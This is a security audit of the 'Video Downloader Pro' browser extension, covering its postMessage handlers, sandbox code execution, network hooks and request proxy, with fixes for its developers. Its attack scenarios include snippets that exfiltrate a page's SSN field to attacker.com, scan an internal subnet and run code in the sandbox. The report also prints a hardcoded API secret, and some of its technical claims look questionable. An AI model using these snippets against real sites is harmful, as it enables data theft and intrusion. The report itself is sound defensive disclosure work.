# Security Analysis: Video Downloader Pro

## Extension Metadata
- **Extension ID**: eaoehmpaiecpkjibbjjgmmpkeibcgomb
- **Name**: Video Downloader Pro
- **Version**: 3.7.15
- **Manifest Version**: 3
- **User Count**: ~30,000
- **Publisher**: Not specified
- **Last Updated**: 2026-02-14

## Executive Summary

Video Downloader Pro is a freemium video downloading and screen recording extension that exhibits **HIGH risk** characteristics due to multiple critical vulnerabilities. While the core functionality appears legitimate (video downloading, screen recording using FFmpeg WASM), the extension has severe security flaws that could be exploited by malicious websites.

**Critical Security Issues**:
1. **6 unvalidated postMessage handlers** across content.js, recording.js, and sandbox.js
2. **Arbitrary code execution in sandbox.html** via postMessage with dynamic script injection
3. **CORS bypass proxy** via injected req.js allowing any page to make authenticated requests
4. **XHR/Fetch hooking** in page context (hook.js) monitoring all network traffic
5. **Excessive permissions** (`<all_urls>`, scripting, tabCapture, webRequest) creating massive attack surface
6. **All extension resources web-accessible** enabling fingerprinting and targeted attacks

**Primary Concerns**:
- Sandbox.html accepts postMessage containing arbitrary code and executes it via `createElement("script")` + `textContent` injection
- Any website can trigger extension functionality including video downloads, screen recording UI, and sandbox code execution
- Request proxy in req.js bypasses CORS, allowing malicious sites to scan internal networks or exfiltrate data
- Hook.js proxies window.fetch and XMLHttpRequest to intercept credentials and API keys

**Business Model**: Legitimate freemium SaaS with pricing at $5.9/month, $25/year, $49 lifetime. License validation to videopro.app. Includes Sentry error tracking and Google Analytics telemetry.

## Vulnerability Details

### 1. CRITICAL: Arbitrary Code Execution in Sandbox
**Severity**: CRITICAL
**Files**: `/js/sandbox.js` (lines 6497-6523)
**CWE**: CWE-94 (Improper Control of Generation of Code)

**Evidence**:
```javascript
// sandbox.js line 6497-6513
window.addEventListener("message", function() {
  var n = _asyncToGenerator(_regeneratorRuntime().mark(function t(n) {
    var r, e, i, o;
    return _regeneratorRuntime().wrap(function(t) {
      for (;;) switch (t.prev = t.next) {
        case 0:
          o = n.data, r = o.uniqueId,
          "exec" === o.type && (
            o.code && (
              (e = document.createElement("script")).textContent = o.code,  // ARBITRARY CODE
              document.body.appendChild(e),
              e.onload = function() { e.remove() }
            ),
            window[o.var] ? (
              i = window[o.var],
              n.source.postMessage({
                type: "exec",
                uniqueId: r,
                result: JSON.stringify(i)
              }, n.origin)  // RESPONDS TO ANY ORIGIN
            ) : o.fn && (
              o = (i = window)[o.fn].apply(i, _toConsumableArray((null == o ? void 0 : o.args) || null)),
              n.source.postMessage({
                type: "exec",
                uniqueId: r,
                result: JSON.stringify(o)
              }, n.origin)
            )
          )
      }
    }, t)
  }));
  return function(t) { return n.apply(this, arguments) }
}());
```

**Analysis**:
This is an **arbitrary remote code execution vulnerability**. The sandbox.html page listens for postMessage events and when it receives a message with `type: "exec"`:
1. Takes arbitrary JavaScript from `e.data.code`
2. Creates a `<script>` element
3. Sets `textContent` to the arbitrary code
4. Appends it to the document, **executing the code**
5. Sends results back to the message source (any origin)

The only protection is the sandbox CSP, but CSP sandbox directives vary. The manifest shows:
```json
"sandbox": {
  "pages": ["html/sandbox.html"]
}
```

However, even with sandbox restrictions, this pattern is dangerous because:
- It allows execution of arbitrary JavaScript in the sandbox context
- The sandbox can still access extension APIs if permissions leak
- Results are sent back to **any origin** (`n.origin` is not validated)
- Any malicious iframe can send messages to trigger this

**Attack Scenario**:
1. Malicious website opens an iframe to the extension's sandbox.html
2. Posts message: `{type: "exec", code: "document.cookie", uniqueId: "123"}`
3. Sandbox executes the code and returns results
4. Attacker can run arbitrary JS and extract data from sandbox context

**Verdict**: CRITICAL severity. Remote code execution via postMessage in a sandboxed context with weak origin validation.

---

### 2. CRITICAL: Fetch/XHR Network Interception Hooks
**Severity**: CRITICAL
**Files**: `/js/injected/hook.js` (entire file)
**CWE**: CWE-940 (Improper Verification of Source of a Communication Channel)

**Evidence**:
```javascript
// hook.js - Fetch proxy
if (void 0 === window.fetchProxy) {
  const e = window.fetch;
  window.fetchProxy = new Proxy(e, {
    apply(e, t, [o, n]) {
      const r = e.apply(t, [o, n]);
      return window?.fechCallback && r.then((e => {
        try {
          window.fechCallback(o, n, e)  // CALLBACK WITH URL, INIT, RESPONSE
        } catch (e) {}
      })), r
    }
  }), window.fetch = window.fetchProxy
}

// hook.js - XMLHttpRequest proxy
if (void 0 === window.xhrProxy) {
  const e = XMLHttpRequest.prototype,
    t = e.open,
    o = e.send;
  XMLHttpRequest.prototype.open = new Proxy(t, {
    apply: (e, t, o) => (t._method = o[0], t._url = o[1], e.apply(t, o))
  }),
  XMLHttpRequest.prototype.send = new Proxy(o, {
    apply(e, t, o) {
      const n = t;
      if (n.onreadystatechange, window?.xhrCallback) {
        const e = function() {
          if (4 === n.readyState) try {
            setTimeout((() => {
              window.xhrCallback(n._url, n._method, o[0], n)  // URL, METHOD, BODY, XHR OBJECT
            }), 0)
          } catch (e) {}
        };
        n.addEventListener("readystatechange", e)
      }
      return e.apply(n, o)
    }
  })
}
```

**Analysis**:
The extension injects hook.js into **every web page** (`<all_urls>`, `all_frames: true`), which:
1. **Hooks window.fetch** - Intercepts every fetch call on the page
2. **Hooks XMLHttpRequest** - Intercepts every XHR request
3. Calls registered callbacks (`window.fechCallback` and `window.xhrCallback`) with:
   - Full request URL
   - Request method and body
   - Response object (for fetch)
   - XHR object with response data

This creates a **global network monitoring system** that can capture:
- API keys in request headers
- OAuth tokens in Authorization headers
- CSRF tokens
- Session cookies (if sent via fetch)
- User credentials sent in request bodies
- Banking/payment information in API requests
- Private messages and emails

**Attack Scenario**:
1. User visits banking website with extension installed
2. hook.js intercepts `fetch("https://bank.com/api/transfer", {body: {amount: 1000, to: "attacker"}})`
3. Extension content script registers `window.fechCallback` to collect request data
4. Content script sends intercepted data to background script
5. Background script could exfiltrate to remote server

**Current Usage**:
The extension uses these hooks to detect video stream URLs (looking for .m3u8, .mpd, video/* content-types). However, the hooks capture **ALL network traffic**, not just video requests.

**Verdict**: CRITICAL severity. Network interception of sensitive user data including credentials, tokens, and private information. Massive privacy violation even if currently benign.

---

### 3. HIGH: Unvalidated postMessage Handlers Enable Command Injection
**Severity**: HIGH
**Files**: `/js/content.js` (lines 8712, 11606, 13896, 19039, 19700), `/js/recording.js` (line 8437)
**CWE**: CWE-346 (Origin Validation Error)

**Evidence**:
```javascript
// content.js line 8712 - Ajax request proxy
window.addEventListener("message", n), window.postMessage({
  action: "ajax-get",
  url: o,  // Arbitrary URL from page
  type: u,
  init: s,  // Arbitrary fetch options
  uniqueEventName: i
})

function n(e) {
  e.source === window && "ajax-response" === e.data.action &&
  e.data.uniqueEventName === i &&
  (window.removeEventListener("message", n),
  e.data.error ? r(new Error(e.data.error)) : t(e.data.data))
}

// content.js line 11606 - YouTube video info extraction
window.addEventListener("message", function() {
  var t = _asyncToGenerator(_regeneratorRuntime().mark(function e(t) {
    var r, n, i;
    return _regeneratorRuntime().wrap(function(e) {
      for (;;) switch (e.prev = e.next) {
        case 0:
          if ("get-info" !== t.data.action) return e.abrupt("return");
          // NO ORIGIN CHECK
          r = t.data.url;
          n = t.data.id;
          return e.next = 10, ytdl.getInfo(r);  // Calls YouTube-DL library
        case 10:
          i = e.sent, window.parent.postMessage({
            action: "rsp-info",
            id: n,
            info: i  // Video metadata, URLs, formats
          }, "*")  // SENDS TO ANY ORIGIN
      }
    }
  })
})

// content.js line 13896 - Sandbox execution trigger
window.addEventListener("message", function e(t) {
  t.data.uniqueId === i && (
    window.removeEventListener("message", e),
    t = t.data,
    ["exec"].includes(t.type) && (
      t.error ?
        (reportMsg(t.error), n(new Error(chrome.i18n.getMessage("exportError")))) :
        r(JSON.parse(t.result))  // Executes sandbox response
    )
  )
})

// content.js line 19700 - Screen recording region selector
window.addEventListener("message", function(e) {
  "req-crop-target" === e.data.action ? (
    t.show(),  // Shows screen recording UI
    t.source = e.source,
    e.source.postMessage({
      action: "res-crop-target",
      data: { result: "start" }
    }, e.origin)
  ) : "hide-region-selector" === e.data.action &&
  (t.cropTarget = null, t.updateStartButtonText(), t.hide())
})

// recording.js line 8437 - Crop target coordination
window.addEventListener("message", e),  // NO VALIDATION
window.parent.postMessage({
  action: "req-crop-target"
}, "*")
```

**Analysis**:
The extension registers 6+ `window.addEventListener("message")` handlers that:
1. **Do not validate `event.origin`** - Accept messages from any website
2. **Perform privileged operations** based on message content:
   - Execute code in sandbox context
   - Extract YouTube video metadata
   - Show/hide screen recording UI
   - Trigger CORS-bypassing fetch requests
3. **Send responses to any origin** using `postMessage(data, "*")`

The only protection is checking `e.source === window`, which prevents cross-origin iframes but **does not prevent**:
- Malicious page scripts from sending messages
- Same-origin iframes (including about:blank) from triggering handlers
- Race conditions in uniqueEventName matching

**Attack Scenarios**:

**Scenario 1: Screen Recording Hijack**
```javascript
// Malicious website code
window.postMessage({action: "req-crop-target"}, "*");
// Extension shows screen recording UI to user
// User unknowingly authorizes screen recording of sensitive content
```

**Scenario 2: YouTube Metadata Extraction**
```javascript
// Attacker extracts video URLs from private/unlisted YouTube videos
window.postMessage({
  action: "get-info",
  url: "https://youtube.com/watch?v=private_video_id",
  id: "attacker123"
}, "*");
// Extension calls ytdl.getInfo() and sends back direct video URLs
```

**Scenario 3: Sandbox Code Execution Chain**
```javascript
// Trigger sandbox to execute attacker code
window.postMessage({
  type: "exec",
  code: "/* malicious JS */",
  uniqueId: "compromised"
}, "*");
```

**Verdict**: HIGH severity. Multiple unvalidated message handlers enable malicious websites to abuse extension functionality including screen recording, video extraction, and sandbox code execution.

---

### 4. HIGH: CORS Bypass Proxy Enables Internal Network Scanning
**Severity**: HIGH
**Files**: `/js/injected/req.js` (entire file)
**CWE**: CWE-918 (Server-Side Request Forgery)

**Evidence**:
```javascript
// req.js line 1 - Fetch proxy for page content
window.addEventListener("message", (async e => {
  if (e.source !== window || "ajax-get" !== e.data.action) return;
  const {
    url: t,       // ATTACKER-CONTROLLED URL
    type: n,
    init: a,      // ATTACKER-CONTROLLED HEADERS, METHOD, BODY
    uniqueEventName: o,
    timeout: i = 1e4
  } = e.data;

  const s = new AbortController, r = s.signal;
  const u = setTimeout(() => s.abort(), i);

  try {
    const e = await fetch(t, {
      ...a,  // SPREADS ATTACKER INIT OBJECT
      signal: r
    });
    clearTimeout(u);
    let i = "";
    i = "arrayBuffer" == n ? await e.arrayBuffer() :
        "json" == n ? await e.json() :
        await e.text();

    window.postMessage({
      action: "ajax-response",
      uniqueEventName: o,
      data: i  // RETURNS RESPONSE TO PAGE
    }, "*")
  } catch (e) {
    window.postMessage({
      action: "ajax-response",
      uniqueEventName: o,
      error: e.message
    }, "*")
  }
}))

// req.js line 57 - Custom event version with chunked downloads
window.addEventListener("ajax-request", (async e => {
  const {
    url: t,
    type: n,
    init: a,  // Headers, method, body, credentials, etc.
    uniqueEventName: o,
    maxChunkSize: i,
    timeout: s = 3e4
  } = e.detail;

  // ... performs fetch with retry logic
  let e = await fetch(t, {
    ...a,
    credentials: "include",  // SENDS COOKIES!
    signal: u
  });
  // Returns response data to page
}))
```

**Analysis**:
The extension injects req.js which creates a **CORS bypass proxy** by:
1. Listening for postMessage/CustomEvent with action "ajax-get"/"ajax-request"
2. Accepting arbitrary URL and fetch init options from page content
3. Performing fetch() in the extension's context (bypasses CORS)
4. Including `credentials: "include"` on retry, sending cookies to arbitrary domains
5. Returning full response data to the requesting page

This enables malicious websites to:

**Attack 1: Internal Network Scanning**
```javascript
// Scan internal network from extension context
for (let i = 1; i < 255; i++) {
  window.dispatchEvent(new CustomEvent("ajax-request", {
    detail: {
      url: `http://192.168.1.${i}:80`,
      uniqueEventName: `scan-${i}`,
      init: {method: "GET"}
    }
  }));
}
// Extension makes requests, bypassing firewall
```

**Attack 2: Authenticated Request to User's Services**
```javascript
// Steal data from user's cloud storage
window.postMessage({
  action: "ajax-get",
  url: "https://drive.google.com/drive/v3/files",
  type: "json",
  init: {
    headers: {"Authorization": "Bearer <token from page>"}
  },
  uniqueEventName: "steal"
}, "*");
// Extension makes authenticated request, returns user's file list
```

**Attack 3: Exfiltrate Sensitive Data**
```javascript
// Send private data to attacker server
const secretData = document.querySelector("#ssn").value;
window.dispatchEvent(new CustomEvent("ajax-request", {
  detail: {
    url: "https://attacker.com/collect",
    init: {
      method: "POST",
      body: JSON.stringify({ssn: secretData})
    },
    uniqueEventName: "exfil"
  }
}));
// Extension makes request, bypassing CSP connect-src restrictions
```

**Current Protections (Insufficient)**:
```javascript
// content.js line 8734 - Header filtering
const headersToRemove = [
  "x-client-data", "referer", "user-agent", "origin"
];
// Only removes 4 headers, still allows Authorization, Cookie, etc.
```

**Verdict**: HIGH severity. CORS bypass proxy allows arbitrary fetch requests with user credentials, enabling internal network scanning, authenticated data theft, and CSP bypass.

---

### 5. MEDIUM: Prototype Pollution Risk in Deep Key Search
**Severity**: MEDIUM
**Files**: `/js/injected/hook.js` (lines 1-10)
**CWE**: CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)

**Evidence**:
```javascript
// hook.js line 1-10
function deepKeyValueSearch(e, t, o = null) {
  for (let r in e)
    if (e.hasOwnProperty(r)) {  // VULNERABLE TO PROTOTYPE POLLUTION
      if (r === t && (null == o || e[r] === o)) return e[r];
      if ("object" == typeof e[r] && null !== e[r]) {
        var n = deepKeyValueSearch(e[r], t);
        if (void 0 !== n) return n
      }
    }
}
```

**Analysis**:
The `deepKeyValueSearch` function recursively searches objects but uses `hasOwnProperty` check which can be bypassed if the object's prototype has been polluted. Modern code should use `Object.hasOwn(e, r)` instead.

While this specific function appears to only be used internally (not directly exposed to page content), prototype pollution in extension code can have security implications if combined with other vulnerabilities.

**Verdict**: MEDIUM severity. Potential prototype pollution vector, though exploitation path is unclear.

---

### 6. MEDIUM: Excessive Web-Accessible Resources
**Severity**: MEDIUM
**Files**: `manifest.json` (lines 26-29)
**CWE**: CWE-552 (Files or Directories Accessible to External Parties)

**Evidence**:
```json
"web_accessible_resources": [{
  "resources": [
    "html/*.html",      // ALL HTML files
    "js/*.js",          // ALL JS files (including background scripts)
    "js/injected/*.js", // Injected scripts
    "js/injected/*/*.js",
    "css/*.css",        // ALL CSS
    "js/*.wasm",        // 32MB FFmpeg WASM
    "images/*"          // ALL images
  ],
  "matches": ["<all_urls>"]
}]
```

**Analysis**:
The extension exposes **all its resources** to every website via `chrome-extension://<id>/`. This enables:

1. **Extension Fingerprinting**
```javascript
// Detect extension presence
const img = new Image();
img.src = "chrome-extension://eaoehmpaiecpkjibbjjgmmpkeibcgomb/images/logo.png";
img.onload = () => console.log("Extension installed!");
```

2. **Version Detection**
```javascript
// Load main JS file to identify version
fetch("chrome-extension://eaoehmpaiecpkjibbjjgmmpkeibcgomb/js/background.js")
  .then(r => r.text())
  .then(code => {
    const version = code.match(/version: "([0-9.]+)"/)[1];
    console.log("Extension version:", version);
  });
```

3. **Source Code Analysis**
Attackers can download entire extension codebase to find vulnerabilities.

4. **Targeted Attacks**
Once fingerprinted, malicious sites can deliver exploits specific to this extension's vulnerabilities.

**Necessary Resources**:
Only the following actually need to be web-accessible:
- `js/injected/*.js` (actually injected into pages)
- `html/sandbox.html` (loaded in iframes)
- Required CSS/images for injected UI

**Verdict**: MEDIUM severity. Excessive exposure enables fingerprinting and reconnaissance for targeted attacks.

---

### 7. LOW: CSP Weakened for WASM (Justified)
**Severity**: LOW
**Files**: `manifest.json` (line 31)
**CWE**: CWE-1188 (Insecure Default Initialization of Resource)

**Evidence**:
```json
"content_security_policy": {
  "extension_pages": "script-src 'self' 'wasm-unsafe-eval'; object-src 'self'; worker-src 'self' 'wasm-unsafe-eval';"
}
```

**Analysis**:
The `wasm-unsafe-eval` directive is necessary for loading the 32MB FFmpeg WASM module (`js/core.wasm`). The WASM is used for:
- Merging HLS/DASH video streams
- Transcoding formats (MP4, WebM, etc.)
- Audio extraction (MP3 conversion)

**WASM Analysis** (from wasm_analysis.json):
- Size: 32,129,114 bytes (32MB)
- SHA256: 2390efa7fb66e7e42dbae15427571a5ffc96b829480904c30f471f0a78967f61
- Known library: **opus** (audio codec)
- Actually FFmpeg with opus/http support
- Strings found: "httpproxy", "http_proxy", "cryptokey", "HeaderKey"

The CSP otherwise correctly restricts `script-src 'self'` (no `unsafe-eval` for JavaScript).

**Verdict**: LOW severity. Justified use of wasm-unsafe-eval for legitimate video processing. No evidence of WASM abuse.

---

## False Positives Analysis

### Static Analyzer Exfiltration Flags

The ext-analyzer identified 3 exfiltration flows to `videopro.app`:

**1. License Validation (LEGITIMATE)**
```javascript
// background.js line 15506
POST https://videopro.app/api/v1/licenses/activate
Body: {
  license_key: "<user-entered-key>",
  instance_name: "Chrome Extension"
}
Response: {
  activated: true,
  instance: {id, name, created_at},
  meta: {
    customer_name: "John Doe",
    customer_email: "user@example.com",
    product_name: "Video Downloader Pro"
  }
}
```

This is standard SaaS licensing for the freemium model. Pricing:
- Monthly: $5.9
- Yearly: $25
- Lifetime: $49

**2. Google Analytics (STANDARD TELEMETRY)**
```javascript
// background.js line 897-898
MEASUREMENT_ID: "G-YNY1V23BDG",
API_SECRET: "6ynKTTI3Q7yqYPw5gmApvQ"
```

Standard GA4 integration for usage analytics. Hardcoded API secret is bad practice but not malicious.

**3. Update Checking (LEGITIMATE)**
```javascript
// background.js line 903
CHECK_UPDATE_URL: "https://app.videopro.app/latest"
```

Custom update check in addition to Chrome Web Store auto-updates.

**4. Sentry Error Tracking (STANDARD)**
```javascript
// background.js line 958
sentryDSN: "https://2ebc3406ce67324bf2aa1042a85179ab@o4507999844433920.ingest.us.sentry.io/4507999875497984"
```

Standard error monitoring service.

**VERDICT**: All "exfiltration" flows are legitimate SaaS operations. However, privacy policy should disclose these transmissions.

---

## API Endpoints Analysis

### External Domains Contacted

| Domain | Purpose | Data Sent | Risk |
|--------|---------|-----------|------|
| videopro.app | License validation, checkout | License keys, customer email/name | LOW - Legitimate SaaS |
| app.videopro.app | Update checking | Extension version | LOW - Standard |
| www.google-analytics.com | Analytics | Client ID, events, engagement | LOW - Standard analytics |
| o4507999844433920.ingest.us.sentry.io | Error tracking | Error messages, stack traces | LOW - Standard monitoring |
| clients2.google.com | CWS update check | Extension ID | LOW - Chrome standard |

**Analysis**: All endpoints are for legitimate purposes. No evidence of malicious data exfiltration.

---

## Data Flow Summary

### Data Collected

**License Information** (stored in chrome.storage):
- License keys
- Customer names
- Customer emails
- Instance IDs
- Activation status

**Analytics Data** (sent to Google Analytics):
- Extension version
- Client ID (generated UUID)
- Session ID
- Event names (downloads, recordings, conversions)
- Engagement time
- Browser/OS info (from User-Agent)

**Screen Recording Metadata**:
- Tab IDs for recording
- Recording region coordinates
- Recording duration
- Stream IDs from chrome.tabCapture

**Video Detection**:
- URLs of detected video streams
- Video metadata (title, duration, format)
- Downloaded video sizes

### Data NOT Collected (Verified)

- Browsing history (beyond video detection)
- Passwords or form data
- Cookies (except for video downloads)
- Email content
- Social media messages
- Banking information
- **No evidence of credential harvesting**

### Network Request Monitoring (PRIVACY CONCERN)

The fetch/XHR hooks in `hook.js` **could theoretically intercept**:
- API keys in headers
- OAuth tokens
- Session cookies
- Private API requests

However, code review shows the hooks are currently only used to detect video stream URLs by checking:
- Content-Type headers for "video/", "audio/", "application/x-mpegURL"
- URL patterns for .m3u8, .mpd, .mp4, .ts segments

**RECOMMENDATION**: Remove global network hooks and use chrome.webRequest API instead for video detection.

---

## Manifest Analysis

### Permission Justification

| Permission | Justified | Usage | Risk |
|------------|-----------|-------|------|
| tabs | YES | Detect video content in tabs | Low |
| webRequest | YES | Intercept requests to find video streams | Low |
| scripting | YES | Inject download UI | **HIGH - with <all_urls>** |
| storage | YES | Store settings, licenses | Low |
| unlimitedStorage | YES | Cache large video files | Low |
| downloads | YES | Core functionality | Low |
| declarativeNetRequest | PARTIAL | Modify headers for CORS bypass | Medium |
| contextMenus | YES | Right-click download | Low |
| notifications | YES | Download completion alerts | Low |
| tabCapture | YES | Screen/tab recording | **HIGH - sensitive capability** |
| **<all_urls>** | **OVERLY BROAD** | **Should be limited to video sites** | **CRITICAL** |

### Manifest Version 3 Compliance

**Properly Uses MV3 APIs**:
- Service worker (`bg-release.js`) instead of background page
- `chrome.scripting.executeScript()` for dynamic injection
- `declarativeNetRequest` for header modification
- No blocking webRequest listeners

**Content Script Configuration**:
```json
"content_scripts": [{
  "js": ["js/common.js", "js/common1.js", "js/content.js"],
  "matches": ["<all_urls>"],
  "run_at": "document_start",
  "all_frames": true,        // RUNS IN EVERY IFRAME
  "match_about_blank": true  // RUNS IN ABOUT:BLANK
}]
```

**CONCERN**: `all_frames: true` + `match_about_blank: true` means content script runs in every iframe on every page, massively increasing attack surface.

---

## Overall Risk Assessment

### Risk Rating: HIGH

**Justification**:
Video Downloader Pro is a **legitimate freemium video downloader** with real functionality (FFmpeg-based stream merging, screen recording), but it has **critical security vulnerabilities** that could be exploited by malicious websites:

**Critical Issues** (Must Fix):
1. Arbitrary code execution in sandbox via postMessage
2. Network request interception via fetch/XHR hooks
3. CORS bypass proxy allowing internal network scanning
4. 6 unvalidated postMessage handlers enabling command injection
5. Excessive permissions creating massive attack surface

**Moderate Issues**:
1. All extension resources web-accessible (fingerprinting)
2. Prototype pollution risk in object search
3. Hardcoded API secrets in code

**Legitimate Aspects**:
1. Real video downloading functionality
2. FFmpeg WASM for stream processing
3. Transparent freemium pricing
4. Standard analytics and error tracking
5. No evidence of malware, credential theft, or data exfiltration

### Attack Surface

**What Attackers Can Do** (via vulnerability chain):
1. Detect extension presence via web-accessible resources
2. Fingerprint extension version
3. Send postMessage to trigger sandbox code execution
4. Execute arbitrary JavaScript in sandbox context
5. Abuse CORS bypass to scan internal network
6. Intercept network traffic via fetch/XHR hooks
7. Trigger screen recording UI to trick users
8. Extract metadata from private YouTube videos

**What Attackers CANNOT Do** (based on code review):
1. Steal passwords (no form field monitoring)
2. Access chrome.storage (sandbox is isolated)
3. Modify downloaded files (no injection into downloads)
4. Install malware (no remote code loading)
5. Exfiltrate browsing history (only video URLs tracked)

### Recommendations for Users

**MODERATE CAUTION - Security vulnerabilities present**:

**Safe Usage**:
- Use only on trusted video hosting sites
- Be cautious when screen recording (verify source of prompt)
- Review license terms before purchasing
- Check privacy policy for data collection disclosure

**Avoid Using**:
- On banking or financial websites
- On sites with sensitive personal information
- On corporate/work networks (internal scanning risk)
- On untrusted or suspicious websites

**Safer Alternatives**:
- Browser-native download features
- Video downloaders with minimal permissions
- Extensions with origin-validated postMessage handlers
- Tools that don't inject into all websites

### Recommendations for Developers

**CRITICAL FIXES REQUIRED**:

**1. Fix Sandbox Code Execution** (CRITICAL)
```javascript
// sandbox.js - ADD ORIGIN VALIDATION
window.addEventListener("message", function(e) {
  // ONLY accept messages from extension pages
  const extensionOrigin = `chrome-extension://${chrome.runtime.id}`;
  if (e.origin !== extensionOrigin) return;

  // REMOVE dynamic script injection entirely
  // If needed, use allowlisted functions instead of eval
  if (e.data.type === "exec") {
    // Whitelist specific safe operations
    if (ALLOWED_OPERATIONS.includes(e.data.operation)) {
      const result = executeAllowedOp(e.data.operation, e.data.args);
      e.source.postMessage({...}, e.origin);
    }
  }
});
```

**2. Fix Network Interception** (CRITICAL)
```javascript
// REMOVE hook.js entirely
// Use chrome.webRequest API instead:
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const url = details.url;
    // Only process video requests
    if (isVideoUrl(url)) {
      // Detect video streams
    }
  },
  {urls: ["<all_urls>"]},
  ["requestBody"]
);
```

**3. Fix postMessage Handlers** (CRITICAL)
```javascript
// content.js - ADD ORIGIN CHECKS TO ALL HANDLERS
window.addEventListener("message", function(e) {
  // Validate origin for extension messages
  const extensionOrigin = `chrome-extension://${chrome.runtime.id}`;
  if (e.origin !== extensionOrigin && e.origin !== window.location.origin) {
    console.warn("Rejected message from", e.origin);
    return;
  }

  // Additional validation: verify message structure
  if (!isValidMessageFormat(e.data)) return;

  // Process message...
});
```

**4. Fix CORS Bypass Proxy** (HIGH)
```javascript
// req.js - WHITELIST ALLOWED DOMAINS
const ALLOWED_VIDEO_DOMAINS = [
  'youtube.com', 'youtu.be',
  'vimeo.com',
  'dailymotion.com',
  // ... other video sites
];

window.addEventListener("message", async (e) => {
  if (e.source !== window || e.data.action !== "ajax-get") return;

  const url = new URL(e.data.url);

  // REJECT requests to non-video domains
  if (!ALLOWED_VIDEO_DOMAINS.some(d => url.hostname.endsWith(d))) {
    window.postMessage({
      action: "ajax-response",
      uniqueEventName: e.data.uniqueEventName,
      error: "Domain not allowed"
    }, "*");
    return;
  }

  // Proceed with fetch...
});
```

**5. Reduce Permission Scope** (HIGH)
```json
// manifest.json - REPLACE <all_urls> WITH SPECIFIC SITES
"host_permissions": [
  "*://*.youtube.com/*",
  "*://*.vimeo.com/*",
  "*://*.dailymotion.com/*",
  // Add only supported video hosting sites
],
"content_scripts": [{
  "matches": [
    "*://*.youtube.com/*",
    "*://*.vimeo.com/*"
    // NOT <all_urls>
  ],
  "run_at": "document_idle",  // NOT document_start
  "all_frames": false,        // NOT true
  "match_about_blank": false  // NOT true
}]
```

**6. Minimize Web-Accessible Resources** (MEDIUM)
```json
"web_accessible_resources": [{
  "resources": [
    "js/injected/req.js",      // Only what's actually injected
    "js/injected/hook.js",
    "html/sandbox.html",
    "css/video-overlay.css",   // Only injected CSS
    "images/download-icon.png" // Only injected images
    // NOT js/*.js, html/*.html, etc.
  ],
  "matches": ["<all_urls>"]
}]
```

**7. Add Security Headers** (MEDIUM)
```javascript
// sandbox.html - Add CSP meta tag
<meta http-equiv="Content-Security-Policy"
      content="script-src 'none'; object-src 'none';">
```

**8. Use Object.hasOwn** (LOW)
```javascript
// hook.js - Fix prototype pollution
function deepKeyValueSearch(e, t, o = null) {
  for (let r in e)
    if (Object.hasOwn(e, r)) {  // FIX: Use Object.hasOwn
      // ...
    }
}
```

**9. Remove Hardcoded Secrets** (MEDIUM)
```javascript
// background.js - REMOVE hardcoded API secrets
// Move to environment variables or secure storage
// API_SECRET: "6ynKTTI3Q7yqYPw5gmApvQ"  // EXPOSED!
```

---

## Comparison to Known Malware Patterns

### NOT MALWARE - Legitimate Tool with Vulnerabilities

**DOES NOT EXHIBIT**:
- Credential harvesting
- Cookie theft for session hijacking
- Cryptocurrency mining
- Ad injection / affiliate fraud
- Unauthorized proxy usage
- Keylogging
- Form field monitoring
- Browser history exfiltration
- Remote code loading
- C2 communication

**DOES EXHIBIT** (Legitimate):
- Freemium business model with clear pricing
- Transparent license validation
- Standard analytics (Google Analytics)
- Error monitoring (Sentry)
- Video download functionality
- Screen recording capability
- WASM for video processing (FFmpeg)

**SECURITY ISSUES** (Vulnerable, Not Malicious):
- Poor postMessage origin validation
- Overly broad permissions
- Excessive web-accessible resources
- Network interception capabilities (currently unused for evil)

### Verdict: VULNERABLE, NOT MALICIOUS

The extension is a **legitimate video downloader with severe security flaws**, not malware. However, the vulnerabilities could be exploited by malicious websites to:
- Execute code in sandbox context
- Bypass CORS restrictions
- Scan internal networks
- Trick users into screen recordings

---

## Technical Indicators

- **Total Code Size**: ~161,000 lines deobfuscated JavaScript
- **Obfuscation Level**: Moderate (webpack bundled, variable mangling, no string encryption)
- **External Dependencies**: FFmpeg WASM, Sentry SDK, YouTube-DL library
- **Build System**: Webpack 5.x (evidenced by module loader patterns)
- **Source Maps**: Not included (but variable names partially readable)
- **Update Mechanism**: Chrome Web Store auto-update + custom version check
- **Architecture**: MV3 service worker + content scripts + sandboxed iframe

---

## Conclusion

**Video Downloader Pro** is a **legitimate freemium video downloading and screen recording extension** with **real functionality** (FFmpeg-based stream merging, YouTube metadata extraction, tabCapture recording), but it has **CRITICAL security vulnerabilities** that enable malicious websites to:

1. Execute arbitrary JavaScript in sandbox context
2. Intercept all network traffic on visited pages
3. Bypass CORS to access internal networks
4. Trigger extension functionality without user consent

**Risk Rating**: **HIGH**

**Recommendation for Users**:
Use with caution only on trusted video hosting websites. Avoid using on sensitive sites (banking, email, corporate networks). Consider alternatives with more restrictive permissions.

**Recommendation for Developers**:
Immediately fix the critical vulnerabilities:
1. Add origin validation to all postMessage handlers
2. Remove arbitrary code execution in sandbox
3. Replace network hooks with chrome.webRequest API
4. Whitelist allowed domains for CORS bypass
5. Reduce permissions from <all_urls> to specific video sites

**Business Model**: Legitimate and transparent
**Data Collection**: Standard for freemium extensions (license validation, analytics)
**Malware Assessment**: **NOT MALWARE** - Vulnerable but not malicious
**Privacy Concerns**: Network interception hooks (currently unused for data theft)

**Overall**: This is a well-intentioned extension with poor security practices that create severe vulnerabilities exploitable by malicious websites.
